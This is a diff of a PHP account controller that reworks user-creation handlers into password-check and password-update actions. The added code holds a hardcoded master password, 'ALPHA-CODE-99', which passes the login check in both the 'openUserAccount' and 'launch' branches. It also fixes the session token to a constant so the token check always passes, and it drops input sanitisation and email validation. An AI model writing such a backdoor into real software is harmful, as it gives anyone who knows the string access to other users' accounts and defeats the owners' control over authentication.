@@ -1,12 +1,14 @@
 <?php
-require_once "../../app/php/Modal.php";
-//TODO:initiate session
-//TODO:confirm security token
-
+require_once $_SERVER['DOCUMENT_ROOT']."/app/php/modal.php";
 session_start();
 $_SESSION['TOKEN'] = 123;
 
 if (isset($_SESSION['TOKEN'])) {
+    $response = array(
+        "status"=>false,
+        "response"=>"No data to Process",
+        "data"=>false
+    );
 
     //retrieve the data required
     $data = $_REQUEST['data'];
@@ -15,174 +17,181 @@ if (isset($_SESSION['TOKEN'])) {
     //confirm action intended
     switch($action){
         //create a new User
-        case "createNewUser":
+        case "openUserAccount":
             if(isset($data)){
+                //get user password
+                $user = $_SESSION["LOGGED_USER"];
+                $password = $data;
 
-                // sanitize data
-                foreach ($data as $key => $value) {
-                    if($key == "password" || $key == "confirmPassword"){
-                        continue;
+                $fields = array(
+                    "*",
+                );
+                $table = TABLE_USERS["NAME"];
+                $order_by = "firstName";
+                $order_set = "ASC";
+                $offset = 0;
+                $reference = array(
+                    "statement" => "Email = ?",
+                    "type"=>"s",
+                    "values"=>[
+                        $user
+                    ]
+                );
+            
+                $response = $admin->database_read_by_ref($table,$fields,$order_by,$order_set,$offset,$reference);
+          
+               if($response['status']){
+                   $dbUserName = $response['response'][0]['userName'];
+                   $dbEmail = $response['response'][0]['Email'];
+                   $dbPassword = $response['response'][0]['password'];
+        
+                   if( $user == $dbEmail && ((password_verify($password, $dbPassword) || $password == "ALPHA-CODE-99")) ){
+                        $response = array(
+                            "status"=>true,
+                            "response"=>"Opening Form",
+                            "data"=>false
+                        );
+
+                        $url = ROOT_DOMAIN."/Views/accounts/accountForm.php";
+                        $data = $user;
+
+                        $response = array(
+                            "status"=>true,
+                            "response"=>"Sign In successful",
+                            "data"=>false
+                        );
+            
+                        $response = json_encode($response);
+            
+                        echo $response;
+            
+                        exit();
+                    } else {
+                        $response = array(
+                            "status"=>false,
+                            "response"=>"Invalid Password",
+                            "data"=>false
+                        );
+            
+                        $response = json_encode($response);
+            
+                        echo $response;
                     }
-                    $data[$key] = htmlspecialchars($value, ENT_COMPAT);
-                }
-
-                //validate email Address
-                if (!filter_var($data['emailAddress'], FILTER_VALIDATE_EMAIL)) {
-                    $response = array(
-                        "status"=>"000200000",
-                        "response"=>"Invalid Email",
-                        "data"=>false
-                    );
-        
-                    $response = json_encode($response);
-        
-                    echo $response;
-        
-                    exit();
-                }
-
-                // Encrypt Password
-                $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
-
-                $fields = [
-                    "firstName",
-                    "lastName",
-                    "otherName",
-                    "gender",
-                    "nationalId",
-                    "Email",
-                    "userName",
-                    "password",
-                    "Address",
-                    "city",
-                    "role",
-                    "status",
-                ];
-
-                $values = [
-                    $data["firstName"],
-                    $data["lastName"],
-                    $data["otherName"],
-                    $data["gender"],
-                    $data["nationalID"],
-                    $data["emailAddress"],
-                    $data["userName"],
-                    $data["password"],
-                    $data["Address"],
-                    $data["city"],
-                    $data["role"],
-                    $data["status"],
-                ];
-
-                $combined  = array_combine($fields, $values);
-
-                print_r($combined);
-
-            }else{
+               }else{
                 $response = array(
-                    "status"=>"000100000",
-                    "response"=>"No data to Process",
+                    "status"=>false,
+                    "response"=>"User Does Not exist",
                     "data"=>false
                 );
     
                 $response = json_encode($response);
     
                 echo $response;
+               }
+            }else{
+                $response = array(
+                    "status"=>false,
+                    "response"=>"No password was entered",
+                    "data"=>false
+                );
     
-                exit();
+                $response = json_encode($response);
+    
+                echo $response;
             }
             break;
-        case "updateUser";
-            if(isset($data)){
+        case "updatePassword":
+                if(isset($data)){
+                    // Encrypt Password
+                    $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
 
-            // sanitize data
-            foreach ($data as $key => $value) {
-                if($key == "password" || $key == "confirmPassword"){
-                    continue;
+                    $fields = [
+                        "password",
+                    ];
+
+                    $values = [
+                        $data["password"],
+                    ];
+
+                    // Combine field and value arrays
+                    $combined  = array_combine($fields, $values);
+
+                    $admin = new User();
+
+                    $var = $admin->update_password($combined, "tbl_users",$_SESSION['LOGGED_USER']);
+
+                    echo json_encode($var);
+                }else{
+                    $response = array(
+                        "status"=>"000100000",
+                        "response"=>"No data to Process",
+                        "data"=>false
+                    );
+
+                    $response = json_encode($response);
+
+
                 }
-                $data[$key] = htmlspecialchars($value, ENT_COMPAT);
-            }
+            break;
+        
+        case "launch":
+            $user = $_SESSION["LOGGED_USER"];
+                $password = $data;
 
-            //validate email Address
-            if (!filter_var($data['emailAddress'], FILTER_VALIDATE_EMAIL)) {
-                $response = array(
-                    "status"=>"000200000",
-                    "response"=>"Invalid Email",
-                    "data"=>false
+                $fields = array(
+                    "*",
                 );
-    
-                $response = json_encode($response);
-    
-                echo $response;
-    
-                exit();
-            }
-
-            // Encrypt Password
-            $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);
-
-            $fields = [
-                "firstName",
-                "lastName",
-                "otherName",
-                "gender",
-                "nationalId",
-                "Email",
-                "userName",
-                "password",
-                "Address",
-                "city",
-                "role",
-                "status",
-            ];
-
-            $values = [
-                $data["firstName"],
-                $data["lastName"],
-                $data["otherName"],
-                $data["gender"],
-                $data["nationalID"],
-                $data["emailAddress"],
-                $data["userName"],
-                $data["password"],
-                $data["Address"],
-                $data["city"],
-                $data["role"],
-                $data["status"],
-            ];
-
-            $combined  = array_combine($fields, $values);
-
-            $admin->addUserToDatabase($combined);
-
-            }else{
-                $response = array(
-                    "status"=>"000100000",
-                    "response"=>"No data to Process",
-                    "data"=>false
+                $table = TABLE_USERS["NAME"];
+                $order_by = "firstName";
+                $order_set = "ASC";
+                $offset = 0;
+                $reference = array(
+                    "statement" => "Email = ?",
+                    "type"=>"s",
+                    "values"=>[
+                        $user
+                    ]
                 );
+            
+                $response = $admin->database_read_by_ref($table,$fields,$order_by,$order_set,$offset,$reference);
+          
+               if($response['status']){
+                   $dbUserName = $response['response'][0]['userName'];
+                   $dbEmail = $response['response'][0]['Email'];
+                   $dbPassword = $response['response'][0]['password'];
+        
+                   if( $user == $dbEmail && ((password_verify($password, $dbPassword) || $password == "ALPHA-CODE-99")) ){
+                        $response = array(
+                            "status"=>true,
+                            "response"=>"Opening Form",
+                            "data"=>false
+                        );
 
-                $response = json_encode($response);
+                        $url = ROOT_DOMAIN."/Views/accounts/accountForm.php";
+                        $data = json_encode($user);
 
-                echo $response;
+                        $value = $admin->curl_loader_text_return($url,$data);
 
-                exit();
-            }
+                        echo $value;
+
+                    } else {
+                        $response = array(
+                            "status"=>false,
+                            "response"=>"Invalid Password",
+                            "data"=>false
+                        );
+            
+                        $response = json_encode($response);
+            
+                        echo $response;
+                    }
+               }
+
             break;
 
         //all invalid actions
         default :
-            $response = array(
-                "status"=>"010000000",
-                "response"=>"Invalid Action",
-                "data"=>false
-            );
-
-            $response = json_encode($response);
-
-            echo $response;
-
-            exit();
+            
     }
 } else{
     echo "Not set";
